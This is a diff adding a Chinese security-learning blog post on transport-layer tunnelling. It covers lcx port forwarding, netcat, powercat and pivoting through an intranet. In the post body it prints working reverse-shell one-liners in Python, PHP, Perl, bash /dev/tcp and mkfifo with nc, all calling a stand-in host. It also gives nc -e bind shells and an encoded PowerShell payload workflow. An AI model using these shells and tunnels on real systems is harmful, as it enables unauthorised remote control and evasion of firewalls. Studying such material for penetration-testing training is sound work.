@@ -1,0 +1,630 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/tu.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/tu.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/tu.ico">
+  <link rel="mask-icon" href="/images/tu.ico" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"mayi077.github.io","root":"/","scheme":"Mist","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":"ture","style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":"ture"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":"ture","mediumzoom":false,"lazyload":"ture","pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":3,"unescape":"ture","preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="0x00 前言前面我们学习了网络层的隧道技术（ICMP、IPV6）,接下来我们继续学习传输层的隧道技术。 0x01 传输层隧道技术&amp;emsp;传输层的隧道技术主要包括 TCP 隧道，UDP隧道和常规端口转发。当内网防火墙阻止了我们对指定端口的访问，我们可以在获取目标机器的权限后使用 iptables 打开指定的端口。当然如果内网中存在一系列的防御系统，TCP、UDP流量会被大量拦截。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="隐藏通信隧道技术之传输层">
+<meta property="og:url" content="https://mayi077.github.io/2021/03/20/%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF-%E4%B8%AD-%E4%B9%8B-%E4%BC%A0%E8%BE%93%E5%B1%82/index.html">
+<meta property="og:site_name" content="信安小蚂蚁">
+<meta property="og:description" content="0x00 前言前面我们学习了网络层的隧道技术（ICMP、IPV6）,接下来我们继续学习传输层的隧道技术。 0x01 传输层隧道技术&amp;emsp;传输层的隧道技术主要包括 TCP 隧道，UDP隧道和常规端口转发。当内网防火墙阻止了我们对指定端口的访问，我们可以在获取目标机器的权限后使用 iptables 打开指定的端口。当然如果内网中存在一系列的防御系统，TCP、UDP流量会被大量拦截。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tva3.sinaimg.cn/large/006Glg0Bly1goqgckne1xj30tt0ecwi0.jpg">
+<meta property="og:image" content="https://tva3.sinaimg.cn/large/006Glg0Bly1goqgp0py6gj30mn0ekq3t.jpg">
+<meta property="og:image" content="https://tvax3.sinaimg.cn/large/006Glg0Bly1goqhjp0d1ej310u0izk96.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/006Glg0Bly1goqhsxamtbj30xq0ijqcx.jpg">
+<meta property="og:image" content="https://tva3.sinaimg.cn/large/006Glg0Bly1goqp155hkmj30ne0bq405.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/006Glg0Bly1goqq5qw3ukj30sg0lcgna.jpg">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/006Glg0Bly1goqqocvcw5j30sa0gq751.jpg">
+<meta property="og:image" content="https://tva3.sinaimg.cn/large/006Glg0Bly1goqrcac6j4j31cn0jjjvo.jpg">
+<meta property="article:published_time" content="2021-03-20T15:06:08.000Z">
+<meta property="article:modified_time" content="2021-03-22T02:42:02.000Z">
+<meta property="article:author" content="信安小蚂蚁">
+<meta property="article:tag" content="内网学习">
+<meta property="article:tag" content="隧道技术">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tva3.sinaimg.cn/large/006Glg0Bly1goqgckne1xj30tt0ecwi0.jpg">
+
+<link rel="canonical" href="https://mayi077.github.io/2021/03/20/%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF-%E4%B8%AD-%E4%B9%8B-%E4%BC%A0%E8%BE%93%E5%B1%82/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>隐藏通信隧道技术之传输层 | 信安小蚂蚁</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">信安小蚂蚁</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right"></div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-主页">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>主页</a>
+
+  </li>
+        <li class="menu-item menu-item-归档">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-标签">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-关于">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mayi077.github.io/2021/03/20/%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF-%E4%B8%AD-%E4%B9%8B-%E4%BC%A0%E8%BE%93%E5%B1%82/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="信安小蚂蚁">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="信安小蚂蚁">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          隐藏通信隧道技术之传输层
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-03-20 23:06:08" itemprop="dateCreated datePublished" datetime="2021-03-20T23:06:08+08:00">2021-03-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-22 10:42:02" itemprop="dateModified" datetime="2021-03-22T10:42:02+08:00">2021-03-22</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">内网学习</span>
+                  </a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.6k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>14 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>前面我们学习了网络层的隧道技术（ICMP、IPV6）,接下来我们继续学习传输层的隧道技术。</p>
+<h3 id="0x01-传输层隧道技术"><a href="#0x01-传输层隧道技术" class="headerlink" title="0x01 传输层隧道技术"></a>0x01 传输层隧道技术</h3><p>&emsp;传输层的隧道技术主要包括 TCP 隧道，UDP隧道和常规端口转发。当内网防火墙阻止了我们对指定端口的访问，我们可以在获取目标机器的权限后使用 iptables 打开指定的端口。当然如果内网中存在一系列的防御系统，TCP、UDP流量会被大量拦截。</p>
+<a id="more"></a>
+<h4 id="LCX-端口转发"><a href="#LCX-端口转发" class="headerlink" title="LCX 端口转发"></a>LCX 端口转发</h4><p>&emsp;lcx是一个基于socket 套接字实现的端口转发工具。windows版本为<code>lcx.exe</code>,Linux版本为<code>portmap</code><br>&emsp;正常的socket隧道必须具备两端：  </p>
+<ol>
+<li>一端为服务端，监听一个端口，等待客户端的连接。</li>
+<li>另一端为客户端，通过服务的的ip和端口主动与服务器连接。</li>
+</ol>
+<h5 id="1、内网端口转发"><a href="#1、内网端口转发" class="headerlink" title="1、内网端口转发"></a>1、内网端口转发</h5><p>在目标主机是执行如下命令，可以将目标主机的3389端口(远程桌面)的所有数据转发到公网vps的4444端口上：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -slave &lt;公网主机iP&gt; 4444  127.0.0.1 3389</span><br></pre></td></tr></table></figure>
+<p>接着我们可以在vps中使用如下命令，将本机监听到的444端口内容转发给本机的5555端口：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">windows:</span><br><span class="line">lcx.exe -listen 4444 5555</span><br><span class="line">linux:</span><br><span class="line">.&#x2F;portmap  -m 2 -p1 6666 -p2 666 -h1 vps</span><br></pre></td></tr></table></figure>
+<p><strong>实验：</strong><br>现有一台内网机器开启3389（1.1.1.7），但是我们本机无法直接。此时我们使用lcx来端口转发。</p>
+<ol>
+<li>在<code>1.1.1.7</code> 上执行如下命令：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe -slave 192.168.152.152 6666 127.0.0.1 3389 </span><br><span class="line">其中，192.168.152.152 为外网的vps装的kali系统</span><br></pre></td></tr></table></figure></li>
+<li>在<code>192.168.152.152</code> kali系统中执行如下命令：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;portmap  -m 2 -p1 6666 -p2 666 -h1 192.168.152.152</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>此时已经完成了端口转发，我们在本机可以直接通过连接<code>192.168.152.152:666</code>来进行远程连接，实验完成！<img data-src="//tva3.sinaimg.cn/large/006Glg0Bly1goqgckne1xj30tt0ecwi0.jpg" alt=""></p>
+<p>顺带说一说 <code>portscan</code> 的用法，他一共有3种模式用-m 指定模式。还有其它4个参数 <code>-p1</code> <code>-p2</code> <code>-h1</code> <code>-h2</code> 三种模式解释如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.监听port1 端口并且连接主机2的port2 端口</span><br><span class="line">2.监听port1和port2 端口。</span><br><span class="line">3.连接主机1对应的端口和主机对应的端口</span><br></pre></td></tr></table></figure>
+
+<h5 id="2、本地端口映射"><a href="#2、本地端口映射" class="headerlink" title="2、本地端口映射"></a>2、本地端口映射</h5><p>&emsp;如果目标服务器由于防火墙的配置，部分端口（列如：3389）的数据无法通过防火墙可以将目标服务器相应端口的数据的数据传到防火墙允许的其他端口（列如：53）。在目标主机上执行如下命令，可以直接使用53端口进行远程桌面连接。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lcx -tran 53 1.1.1.7 3389</span><br><span class="line">意思是把53监听到的数据传到指定ip和端口</span><br></pre></td></tr></table></figure>
+<p><img data-src="//tva3.sinaimg.cn/large/006Glg0Bly1goqgp0py6gj30mn0ekq3t.jpg" alt=""></p>
+<h4 id="netcat-nc"><a href="#netcat-nc" class="headerlink" title="netcat(nc)"></a>netcat(nc)</h4><p>&emsp;之所以叫netcat是因为他是网络上的cat，可以从网络的一端读取数据到另一端输出。  </p>
+<h5 id="nc的常用参数"><a href="#nc的常用参数" class="headerlink" title="nc的常用参数"></a>nc的常用参数</h5><ol>
+<li>抓取 banner信息 使用 <code>-nv</code>参数</li>
+<li>扫描指定端口 <code>nc -v -z 192.168.152.152 110-1111</code>  需要很久，他会等结束后返回结果。</li>
+<li>端口监听 <code>nc -lp</code> 其中 l 表示监听模式p用来指定端口。一般我们会用 <code>nc -lvp</code> v用来显示详细信息。</li>
+<li>文件传输，大概思路就说我们vps监听一个端口并把内容重定向输出给一个文件，随后我们目标主机主动连接我们vps的指定端口并把一个文件重定向输入。具体命令, vps: <code>nc -lp 333 &gt; 1.txt</code>,目标主机:<code>nc -vn 192.168.152.152 333 -q 1</code> 其中 -q参数是在发送EOF后XX秒断开连接。有些版本有-q 有些无<img data-src="//tvax3.sinaimg.cn/large/006Glg0Bly1goqhjp0d1ej310u0izk96.jpg" alt="nc传文件"></li>
+<li>简易聊天 只需一方监听一方连接即可如：vps <code>nc -lp 888</code> 目标 <code>nc -nv 192.168.152.152 888</code><img data-src="//tva1.sinaimg.cn/large/006Glg0Bly1goqhsxamtbj30xq0ijqcx.jpg" alt="图片"></li>
+</ol>
+<h5 id="获取Shell"><a href="#获取Shell" class="headerlink" title="获取Shell"></a>获取Shell</h5><p>shell分为两种：<br> 一种是正向shell，另一种是反向shell  </p>
+<ol>
+<li>正向shell：客户端连接服务器，客户端想要获取服务器的shell</li>
+<li>反向shell：客户端连接服务器，服务器想要获取客户端的shell   </li>
+</ol>
+<p>反向shell通常用在开启了防护措施的目标主机上，列如防火墙过滤，端口转发。</p>
+<h6 id="1、正向shell"><a href="#1、正向shell" class="headerlink" title="1、正向shell"></a>1、正向shell</h6><p>在目标主机中输入以下命令，进行监听主机的端口流量并重定向给其它程序执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444 -e &#x2F;bin&#x2F;bash                  &#x2F;&#x2F; linux</span><br><span class="line">nc -lvp 4444 -e c:\windows\system32\cmd.exe      &#x2F;&#x2F; windows</span><br></pre></td></tr></table></figure>
+<p>此时我们vps只需要连接就可以了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.227.137 4444</span><br></pre></td></tr></table></figure>
+<p>接着我们在vps中输入的命令就会被目标主机当作shell执行</p>
+<h6 id="2、反向shell"><a href="#2、反向shell" class="headerlink" title="2、反向shell"></a>2、反向shell</h6><p>在vps上监听一个端口，如使用<code>nc -lvp 666</code>。然后再在目标主机使用命令连接vps的这个端口，并重定向程序到cmd或者sh使用命令如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.152.137 9999 -e &#x2F;bin&#x2F;sh							&#x2F;&#x2F;linux</span><br><span class="line">nc 192.168.152.137 -e c:\windows\system32\cmd.exe			&#x2F;&#x2F;windows</span><br></pre></td></tr></table></figure>
+
+<h6 id="3、在目标主机中没有nc时获取反向shell"><a href="#3、在目标主机中没有nc时获取反向shell" class="headerlink" title="3、在目标主机中没有nc时获取反向shell"></a>3、在目标主机中没有nc时获取反向shell</h6><p><a href="https://mayi077.gitee.io/2020/03/27/%E5%8F%8D%E5%BC%B9shell-payload%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">【以前收集的反弹shellpayload】</a>   </p>
+<ol>
+<li>python 反向shell <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一种：</span><br><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br><span class="line">或者：</span><br><span class="line">python -c &quot;exec(\&quot;import socket, subprocess;s &#x3D; socket.socket();s.connect((&#39;10.0.0.1&#39;,1234))\nwhile 1:  proc &#x3D; subprocess.Popen(s.recv(1024), shell&#x3D;True, stdout&#x3D;subprocess.PIPE, stderr&#x3D;subprocess.PIPE, stdin&#x3D;subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</span><br></pre></td></tr></table></figure></li>
+<li>PHP反向shell<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#39;$sock&#x3D;fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span><br></pre></td></tr></table></figure></li>
+<li>利用中间文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;tmp&#x2F;fifo | &#x2F;bin&#x2F;bash -i 2&gt;&amp;1 | nc 目标IP 端口 &gt; &#x2F;tmp&#x2F;fifo</span><br></pre></td></tr></table></figure></li>
+<li>perl 反向shell<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;10.0.0.1&quot;;$p&#x3D;1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br><span class="line">或者（升级版）：</span><br><span class="line">perl -MIO -e &#39;$p&#x3D;fork;exit,if($p);$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;10.0.0.1:1234&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span><br></pre></td></tr></table></figure></li>
+<li>nc版本问题不支持 -e的可以用如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;&#x2F;tmp&#x2F;f</span><br></pre></td></tr></table></figure></li>
+<li>其它还有很多，这里我们研究一下 <code>bash -i</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;8080 0&gt;&amp;1</span><br><span class="line">注意这个是由解析shell的bash完成，所以某些情况下不支持。</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>我们来分析一下，<code>bash -i</code>是创建一个交互式shell<code>&gt;&amp;</code>  当后面接文件时表标准输出和标准错误输出重定向到文件，也就是<code>/dev/tcp/10.0.0.1/8080</code>而这个文件是一个特殊的设备，相当于给对应IP端口发出一个socket连接。 而最后的 <code>0&gt;&amp;1</code>表示标准输入重定向到标准输出而标准输出又重定向到socket连接。</p>
+<h6 id="4、内网代理"><a href="#4、内网代理" class="headerlink" title="4、内网代理"></a>4、内网代理</h6><p>环境：kali无法访问数据库服务器，但是可以通过web服务器跳板访问到数据库服务器。<img data-src="//tva3.sinaimg.cn/large/006Glg0Bly1goqp155hkmj30ne0bq405.jpg" alt=""></p>
+<ol>
+<li>kali执行:<br>nc -lvp 3333</li>
+<li>数据库执行:<br>nc -lvp 3333 -e /bin/sh</li>
+<li>web服务器执行：<br>nc -v 192.168.1.4 3333 -C “nc -v 1.1.1.200 3333”  这里的 -C是大C且有些nc不存在-C，它的作用是 </li>
+</ol>
+<p>发送CRLF作为行结束</p>
+<p>原理：把web服务器当作中间机，使kali与数据库通信</p>
+<h4 id="powercat"><a href="#powercat" class="headerlink" title="powercat"></a>powercat</h4><p>powercat 相当于powershell版nc</p>
+<h5 id="1、安装"><a href="#1、安装" class="headerlink" title="1、安装"></a>1、安装</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;besimorhino&#x2F;powercat.git</span><br></pre></td></tr></table></figure>
+<p>下载后导入模块，然后输入<code>powercat -h</code> 就可以查看到帮助信息：<br><img data-src="//tva1.sinaimg.cn/large/006Glg0Bly1goqq5qw3ukj30sg0lcgna.jpg" alt="powercat 帮助信息"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">主要命令：</span><br><span class="line">-l      监听一个连接                       </span><br><span class="line">-c      连接到一个监听</span><br><span class="line">-p      指定端口</span><br><span class="line">-e      指定一个程序执行</span><br><span class="line">-ep     执行Powershell       </span><br><span class="line">-v      显示详细信息     </span><br><span class="line">-r      Relay. Format: &quot;-r tcp:10.1.1.1:443&quot;                 [String]</span><br><span class="line">-u      Transfer data over UDP.                              [Switch]</span><br><span class="line">-dns    Transfer data over dns (dnscat2).                    [String]</span><br><span class="line">-dnsft  DNS Failure Threshold.                               [int32]</span><br><span class="line">-t      Timeout option. Default: 60                          [int32]</span><br><span class="line">-i      输入，可以直接写字符串也可以写文件</span><br><span class="line">-o      Console Output Type: &quot;Host&quot;, &quot;Bytes&quot;, or &quot;String&quot;    [String]</span><br><span class="line">-of     输出文件名，可以在文件名前加路径</span><br><span class="line">-d      Disconnect after connecting.                         [Switch]</span><br><span class="line">-rep    Repeater. Restart after disconnecting.               [Switch]</span><br><span class="line">-g      生成payload     [Switch]</span><br><span class="line">-ge     生成加密 Payload.    [Switch]</span><br><span class="line">-h      打印出帮助</span><br></pre></td></tr></table></figure>
+<p>看到这里我们发现nc的功能它基本都可以实现，这里我们主要学习一下不太一样的功能。</p>
+<h5 id="2、利用powercat-g-生成payload"><a href="#2、利用powercat-g-生成payload" class="headerlink" title="2、利用powercat -g 生成payload"></a>2、利用powercat -g 生成payload</h5><ol>
+<li>在攻击机说执行如下命令来生成payload,获得一个cmd执行shell文件。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -p 8000 -e cmd -v -g &gt;&gt; shell.ps1</span><br></pre></td></tr></table></figure></li>
+<li>在目标主机允许 我们生成的shell.ps1文件。</li>
+<li>在攻击主机中连接到我们的目标主机指定端口。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -c 192.168.1.180 -p 8000 -v</span><br></pre></td></tr></table></figure>
+<img data-src="//tva2.sinaimg.cn/large/006Glg0Bly1goqqocvcw5j30sa0gq751.jpg" alt="成功获得cmd的shell"><br>同理如果我们想反弹powershell而不是cmd，那么我们身材payload时使用如下命令：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -p 8000 -ep -v -g &gt;&gt; shell.ps1</span><br></pre></td></tr></table></figure>
+这里 <code>-ep</code> 就说执行powershell<br>如果我们需要生成经过编码的payload使用如下命令：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -p 8000 -ep -v -ge &gt;&gt; powershell_ge.ps1</span><br></pre></td></tr></table></figure>
+随后我们在 目标主机使用：<code>powershell -e [编码后的payload]</code> 注意这里是powershell了，不是powercat。<br><img data-src="//tva3.sinaimg.cn/large/006Glg0Bly1goqrcac6j4j31cn0jjjvo.jpg" alt=""></li>
+</ol>
+<h5 id="3、powercat作为跳板"><a href="#3、powercat作为跳板" class="headerlink" title="3、powercat作为跳板"></a>3、powercat作为跳板</h5><p><strong>环境：</strong><br>&emsp;webserver可ping数据库server和vps，vps不能访问数据库server。<br><strong>sqlserver（监听）：</strong><br><code>powercat -l -v -p [本地监听端口] -e cmd.exe</code><br><strong>WebServer(连接，监听)：</strong><br><code>powercat -l -v -p [设置一个监听端口] -r tcp:[sqlserverip:sqlserver监听端口]</code> 注意这里是<code>-r</code><br><strong>vps(连接)：</strong><br><code>nc [webserverIP] [webserver监听端口] -vv</code>  </p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>信安小蚂蚁
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://mayi077.github.io/2021/03/20/%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF-%E4%B8%AD-%E4%B9%8B-%E4%BC%A0%E8%BE%93%E5%B1%82/" title="隐藏通信隧道技术之传输层">https://mayi077.github.io/2021/03/20/隐藏通信隧道技术-中-之-传输层/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/publicdomain/zero/1.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>ZERO</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+     <div>
+       
+         ﻿<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+         
+      </div>
+
+
+      <footer class="post-footer">
